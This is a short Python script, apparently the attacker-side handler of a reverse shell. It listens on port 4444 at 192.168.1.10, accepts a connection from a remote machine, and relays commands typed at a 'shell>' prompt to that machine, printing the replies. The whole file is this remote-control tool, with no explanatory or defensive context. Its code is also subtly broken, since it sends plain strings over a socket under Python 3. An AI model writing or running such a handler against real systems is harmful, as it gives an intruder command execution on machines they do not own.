#!/usr/bin/python

import socket

host = '192.168.1.10'
port = 4444

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)

    print("[+] Listening for incoming TCP connection on port 4444.")

    conn, addr = s.accept()

    print("[+] We got connection from: ", addr)

    while True:

        command = input("shell> ")

        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command)
            print(conn.recv(1024))

def main():
    connect()

main()